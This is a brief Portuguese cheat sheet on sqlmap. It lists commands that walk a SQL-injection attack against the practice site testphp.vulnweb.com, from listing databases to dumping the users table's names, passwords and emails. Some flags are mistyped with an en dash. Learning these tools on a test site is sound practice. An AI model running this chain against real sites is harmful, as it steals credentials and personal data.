# SQLMap

Site para testes http://testphp.vulnweb.com

$sqlmap --help

$sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs

$sqlmap -u  http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs -D acuart –-tables

$sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs -D acuart -T users –-columns

$sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs -D acuart -T users -C name,pass,uname,email –-dump

## Fontes:

https://www.100security.com.br/sqlmap

https://github.com/sqlmapproject/sqlmap/wiki/Introduction
